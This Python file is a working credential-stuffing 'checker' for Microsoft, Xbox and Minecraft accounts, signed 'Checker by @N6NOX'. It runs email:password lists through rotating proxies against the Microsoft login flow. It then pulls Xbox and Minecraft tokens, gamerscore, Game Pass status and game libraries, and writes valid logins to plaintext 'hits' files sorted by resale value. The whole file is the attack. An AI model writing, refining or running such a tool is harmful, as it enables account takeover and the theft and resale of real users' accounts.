import os
import time
import requests
import re
import threading
import random
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
from typing import Dict, List, Tuple, Optional, Any

urllib3.disable_warnings()

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 3
REQUEST_TIMEOUT = 10


class XboxStats:
    def __init__(self):
        self.total_checked = 0
        self.total_hits = 0
        self.minecraft_hits = 0
        self.gamepass_hits = 0
        self.xbox_hits = 0
        self.not_linked_hits = 0
        self.two_fa_accounts = 0
        self.bad_accounts = 0
        self.errors = 0
        self.retries = 0
        self.lock = threading.Lock()
    
    def increment_checked(self):
        with self.lock:
            self.total_checked += 1
    def increment_hit(self):
        with self.lock:
            self.total_hits += 1
    def increment_minecraft(self):
        with self.lock:
            self.minecraft_hits += 1
    def increment_gamepass(self):
        with self.lock:
            self.gamepass_hits += 1
    def increment_xbox(self):
        with self.lock:
            self.xbox_hits += 1
    def increment_not_linked(self):
        with self.lock:
            self.not_linked_hits += 1
    def increment_two_fa(self):
        with self.lock:
            self.two_fa_accounts += 1
    def increment_bad(self):
        with self.lock:
            self.bad_accounts += 1
    def increment_error(self):
        with self.lock:
            self.errors += 1
    def increment_retry(self):
        with self.lock:
            self.retries += 1
    
    def get_stats(self) -> Dict[str, Any]:
        with self.lock:
            return {
                'total_checked': self.total_checked,
                'total_hits': self.total_hits,
                'minecraft_hits': self.minecraft_hits,
                'gamepass_hits': self.gamepass_hits,
                'xbox_hits': self.xbox_hits,
                'not_linked_hits': self.not_linked_hits,
                'two_fa_accounts': self.two_fa_accounts,
                'bad_accounts': self.bad_accounts,
                'errors': self.errors,
                'retries': self.retries
            }


class ProxyManager:
    def __init__(self, proxy_list: Optional[List[str]] = None):
        self.proxies = []
        if proxy_list:
            self.load_proxies(proxy_list)
        self.current_index = 0
        self.lock = threading.Lock()
    
    def load_proxies(self, proxy_list: List[str]):
        for proxy_str in proxy_list:
            if not proxy_str or not proxy_str.strip():
                continue
            parts = proxy_str.strip().split(':')
            if len(parts) == 4:
                host, port, user, pwd = parts
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                self.proxies.append({"http": proxy_url, "https": proxy_url})
            elif len(parts) == 2:
                ip, port = parts
                proxy_url = f"http://{ip}:{port}"
                self.proxies.append({"http": proxy_url, "https": proxy_url})
    
    def get_random_proxy(self) -> Optional[Dict[str, str]]:
        if not self.proxies:
            return None
        with self.lock:
            return random.choice(self.proxies)


class MicrosoftAuthenticator:
    @staticmethod
    def get_sftag(session: requests.Session, max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], Optional[str]]:
        for attempt in range(max_attempts):
            try:
                response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
                text = response.text
                match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
                if match:
                    sftag = match.group(1)
                    match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match:
                        return match.group(1), sftag
            except:
                pass
            time.sleep(0.5)
        return None, None
    
    @staticmethod
    def login(session: requests.Session, email: str, password: str, url_post: str, sftag: str,
              stats_ref: Optional[Any] = None, max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], str]:
        for attempt in range(max_attempts):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
                login_request = session.post(
                    url_post, data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    allow_redirects=True, timeout=REQUEST_TIMEOUT
                )
                if '#' in login_request.url and login_request.url != SFTAG_URL:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        d = {
                            'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                            'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                            'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                        }
                        action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                        ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                        fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            return token, "success"
                    except:
                        pass
                elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return None, "2fa"
                elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                    return None, "bad"
            except:
                if stats_ref:
                    stats_ref.increment_retry()
                if attempt == max_attempts - 1:
                    return None, "error"
            time.sleep(0.5)
        return None, "error"


class XboxAuthenticator:
    @staticmethod
    def get_xbox_token(session: requests.Session, ms_token: str, stats_ref: Optional[Any] = None,
                      max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], Optional[str]]:
        for attempt in range(max_attempts):
            try:
                payload = {
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                    "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
                }
                response = session.post(
                    'https://user.auth.xboxlive.com/user/authenticate',
                    json=payload,
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200:
                    data = response.json()
                    xbox_token = data.get('Token')
                    if xbox_token:
                        return xbox_token, data['DisplayClaims']['xui'][0]['uhs']
                elif response.status_code == 429:
                    time.sleep(2); continue
            except:
                if stats_ref:
                    stats_ref.increment_retry()
                if attempt == max_attempts - 1: return None, None
            time.sleep(0.5)
        return None, None
    
    @staticmethod
    def get_xsts_token(session: requests.Session, xbox_token: str, stats_ref: Optional[Any] = None,
                      max_attempts: int = MAX_RETRIES) -> Optional[str]:
        for attempt in range(max_attempts):
            try:
                payload = {
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
                }
                response = session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json=payload,
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200: return response.json().get('Token')
                elif response.status_code == 429: time.sleep(2); continue
            except:
                if stats_ref:
                    stats_ref.increment_retry()
                if attempt == max_attempts - 1: return None
            time.sleep(0.5)
        return None


class MinecraftAuthenticator:
    @staticmethod
    def get_minecraft_token(session: requests.Session, uhs: str, xsts_token: str,
                           stats_ref: Optional[Any] = None, max_attempts: int = MAX_RETRIES) -> Optional[str]:
        for attempt in range(max_attempts):
            try:
                response = session.post(
                    'https://api.minecraftservices.com/authentication/login_with_xbox',
                    json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                    headers={'Content-Type': 'application/json'},
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200: return response.json().get('access_token')
                elif response.status_code == 429: time.sleep(2); continue
            except:
                if stats_ref:
                    stats_ref.increment_retry()
                if attempt == max_attempts - 1: return None
            time.sleep(0.5)
        return None
    
    @staticmethod
    def check_entitlements(session: requests.Session, mc_token: str, stats_ref: Optional[Any] = None,
                          max_attempts: int = MAX_RETRIES) -> Tuple[Optional[str], List[str]]:
        for attempt in range(max_attempts):
            try:
                response = session.get(
                    'https://api.minecraftservices.com/entitlements/mcstore',
                    headers={'Authorization': f'Bearer {mc_token}'},
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200:
                    text = response.text
                    if 'product_game_pass_ultimate' in text:
                        return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                    elif 'product_game_pass_pc' in text:
                        return 'Xbox Game Pass', ["Xbox Game Pass"]
                    elif '"product_minecraft"' in text:
                        return 'Minecraft', ["Minecraft Java"]
                    else:
                        others = []
                        if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                        if 'product_legends' in text:           others.append("Legends")
                        if 'product_dungeons' in text:          others.append("Dungeons")
                        if others: return 'Xbox: ' + ', '.join(others), others
                        return None, []
                elif response.status_code == 429:
                    time.sleep(2); continue
                else:
                    return None, []
            except:
                if stats_ref:
                    stats_ref.increment_retry()
                if attempt == max_attempts - 1: return None, []
            time.sleep(0.5)
        return None, []
    
    @staticmethod
    def get_profile(session: requests.Session, mc_token: str, stats_ref: Optional[Any] = None,
                   max_attempts: int = MAX_RETRIES) -> Optional[Dict[str, Any]]:
        for attempt in range(max_attempts):
            try:
                response = session.get(
                    'https://api.minecraftservices.com/minecraft/profile',
                    headers={'Authorization': f'Bearer {mc_token}'},
                    timeout=REQUEST_TIMEOUT
                )
                if response.status_code == 200:   return response.json()
                elif response.status_code == 404: return None
                elif response.status_code == 429: time.sleep(2); continue
            except:
                if stats_ref:
                    stats_ref.increment_retry()
                if attempt == max_attempts - 1: return None
            time.sleep(0.5)
        return None


class XboxEngine:
    def __init__(self, results_dir: str = "Results", proxy_list: Optional[List[str]] = None):
        self.results_dir = results_dir
        self.stats = XboxStats()
        self.proxy_manager = ProxyManager(proxy_list)
        self.dirs = {
            "minecraft": os.path.join(results_dir, "Minecraft"),
            "gamepass": os.path.join(results_dir, "GamePass"),
            "xbox": os.path.join(results_dir, "Xbox"),
            "not_linked": os.path.join(results_dir, "HitNotLinked"),
            "two_fa": os.path.join(results_dir, "2FA"),
        }
        for d in self.dirs.values():
            os.makedirs(d, exist_ok=True)
        self.full_games_dir = os.path.join(results_dir, "XBOX_RESULT")
        os.makedirs(self.full_games_dir, exist_ok=True)
        self.full_log = os.path.join(self.full_games_dir, "XBOX-Hits-Full-Games.txt")
        self.gscore_log = os.path.join(self.full_games_dir, "XBOX-GScore-Hits.txt")
        self.gamepass_log = os.path.join(self.full_games_dir, "XBOX-GamePass-Hits.txt")
        self.minecraft_log = os.path.join(self.full_games_dir, "XBOX-Minecraft-Hits.txt")
    
    def _get_session_with_proxy(self) -> requests.Session:
        session = requests.Session()
        session.verify = False
        session.mount('https://', HTTPAdapter(pool_connections=50, pool_maxsize=50))
        proxy = self.proxy_manager.get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        return session
    
    def _get_formatted_games(self, session, uhs, xsts_token):
        formatted_list = ""
        premium_keywords = [
            "resident evil", "fifa", "fc 24", "fc 25", "fc 26", "modern warfare",
            "call of duty", "black ops", "pes", "efootball", "rust", "elden ring",
            "dark souls", "ark"
        ]
        try:
            me_url = "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag"
            headers = {
                "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
                "x-xbl-contract-version": "2",
                "Accept": "application/json"
            }
            me_resp = session.get(me_url, headers=headers, timeout=10)
            if me_resp.status_code == 200:
                xuid = me_resp.json()['profileUsers'][0]['id']
                ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles?maxItems=999"
                ach_resp = session.get(ach_url, headers=headers, timeout=10)
                if ach_resp.status_code == 200:
                    titles = ach_resp.json().get('titles', [])
                    for i, t in enumerate(titles, 1):
                        game_name = t.get('name', 'Unknown Game')
                        current_score = t.get('currentGamerscore', 0)
                        is_premium = False
                        for key in premium_keywords:
                            if key.lower() in game_name.lower():
                                is_premium = True
                                break
                        premium_tag = " | PREMIUM" if is_premium else ""
                        formatted_list += f"{i} - {game_name} | Score: {current_score}G{premium_tag}\n"
        except:
            pass
        return formatted_list
    
    def save_result(self, category: str, result: Dict[str, Any]):
        try:
            games_list = result.get('games_list', '')
            subs_str = ", ".join(result.get('subscriptions', [])) if result.get('subscriptions') else "None"
            capture = (
                f"Email         : {result['email']}\n"
                f"Password      : {result['password']}\n"
                f"Name          : {result.get('name', 'N/A')}\n"
                f"UUID          : {result.get('uuid', 'N/A')}\n"
                f"Capes         : {result.get('capes', 'N/A')}\n"
                f"Type          : {result['account_type']}\n"
                f"Subscriptions : {subs_str}\n"
                f"\nGames List:\n{games_list}\n"
                f"{'='*60}"
            )
            file_name = {
                "minecraft": "Minecraft-hits_by_bot.txt",
                "gamepass": "game_pass-hits_by_bot.txt",
                "xbox": "xbox-hits_by_bot.txt",
            }.get(category, "hits.txt")
            file_path = os.path.join(self.dirs.get(category, self.results_dir), file_name)
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(capture + '\n')
        except:
            pass
    
    def save_not_linked(self, email: str, password: str):
        try:
            file_path = os.path.join(self.dirs["not_linked"], "not_linked_by_bot.txt")
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | Xbox (Not Linked)\n")
        except:
            pass
    
    def save_two_fa(self, email: str, password: str):
        try:
            file_path = os.path.join(self.dirs["two_fa"], "2fa_by_bot.txt")
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        except:
            pass
    
    def check_account(self, email: str, password: str) -> Optional[Dict[str, Any]]:
        self.stats.increment_checked()
        session = self._get_session_with_proxy()
        
        try:
            url_post, sftag = MicrosoftAuthenticator.get_sftag(session)
            if not url_post or not sftag:
                self.stats.increment_error()
                return None
            
            ms_token, auth_status = MicrosoftAuthenticator.login(session, email, password, url_post, sftag, self.stats)
            
            if auth_status == "2fa":
                self.stats.increment_two_fa()
                self.stats.increment_hit()
                self.save_two_fa(email, password)
                return {
                    "email": email,
                    "password": password,
                    "status": "2fa",
                    "account_type": "2FA Protected"
                }
            elif auth_status == "bad":
                self.stats.increment_bad()
                return None
            elif auth_status != "success" or not ms_token:
                self.stats.increment_error()
                return None
            
            xbox_token, uhs = XboxAuthenticator.get_xbox_token(session, ms_token, self.stats)
            if not xbox_token or not uhs:
                self.stats.increment_bad()
                return None
            
            xsts_token = XboxAuthenticator.get_xsts_token(session, xbox_token, self.stats)
            if not xsts_token:
                self.stats.increment_bad()
                return None
            
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15)
            gamerscore_int = 0
            games_list = ""
            if xsts_xb_req.status_code == 200:
                x_token = xsts_xb_req.json()['Token']
                games_list = self._get_formatted_games(session, uhs, x_token)
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore", headers={"Authorization": f"XBL3.0 x={uhs};{x_token}", "x-xbl-contract-version": "2"}, timeout=15)
                if prof_req.status_code == 200:
                    gamerscore_int = int(prof_req.json()['profileUsers'][0]['settings'][0]['value'])
            
            if gamerscore_int < 1:
                self.stats.increment_bad()
                return None
            
            gamepass_status = "none"
            minecraft_owned = False
            
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, timeout=15)
            if xsts_mc_req.status_code == 200:
                try:
                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_req.json()['Token']}"}, timeout=15)
                    if mc_auth.status_code == 200:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f"Bearer {mc_auth.json()['access_token']}"}, timeout=15)
                        ent_data = ent_req.json()
                        ent_t = ent_req.text.lower()
                        if 'product_game_pass_ultimate' in ent_t:
                            gamepass_status = "Ultimate"
                        elif 'product_game_pass_pc' in ent_t:
                            gamepass_status = "PC"
                        elif 'product_game_pass_extra' in ent_t:
                            gamepass_status = "Extra"
                        elif 'product_game_pass_premium' in ent_t:
                            gamepass_status = "Premium"
                        elif 'product_game_pass_core' in ent_t:
                            gamepass_status = "Core"
                        elif 'product_game_pass' in ent_t:
                            gamepass_status = "Standard/Other"
                        if 'items' in ent_data:
                            for item in ent_data['items']:
                                name = item.get('name', '').lower()
                                if 'minecraft' in name:
                                    minecraft_owned = True
                                    break
                        if 'minecraft' in ent_t:
                            minecraft_owned = True
                except:
                    pass
            
            final_output = (
                f"_________________________________________________________\n"
                f"Email: {email}\n"
                f"Password: {password}\n"
                f"Gamerscore: {gamerscore_int}G\n"
                f"GamePass: {gamepass_status}\n"
                f"Minecraft: {'YES' if minecraft_owned else 'NO'}\n"
                f"Games List:\n{games_list}"
                f"Checker by @N6NOX\n"
                f"_________________________________________________________\n"
            )
            
            with open(self.full_log, 'a', encoding='utf-8') as f:
                f.write(final_output + '\n')
            with open(self.gscore_log, 'a', encoding='utf-8') as f:
                f.write(final_output + '\n')
            if gamepass_status != "none":
                with open(self.gamepass_log, 'a', encoding='utf-8') as f:
                    f.write(final_output + '\n')
            if minecraft_owned:
                with open(self.minecraft_log, 'a', encoding='utf-8') as f:
                    f.write(final_output + '\n')
            
            self.stats.increment_hit()
            self.stats.increment_xbox()
            if gamepass_status != "none":
                self.stats.increment_gamepass()
            if minecraft_owned:
                self.stats.increment_minecraft()
            
            account_type = f"Gamerscore: {gamerscore_int}G | GamePass: {gamepass_status} | Minecraft: {'YES' if minecraft_owned else 'NO'}"
            subscriptions = []
            if gamepass_status != "none":
                subscriptions.append(f"GamePass: {gamepass_status}")
            if minecraft_owned:
                subscriptions.append("Minecraft")
            
            result = {
                "status": "HIT",
                "email": email,
                "password": password,
                "account_type": account_type,
                "name": "N/A",
                "uuid": "N/A",
                "capes": "N/A",
                "subscriptions": subscriptions,
                "games_list": games_list
            }
            self.save_result("xbox", result)
            return result
        
        except Exception:
            self.stats.increment_error()
            return None
        finally:
            session.close()
    
    def get_stats(self) -> Dict[str, Any]:
        return self.stats.get_stats()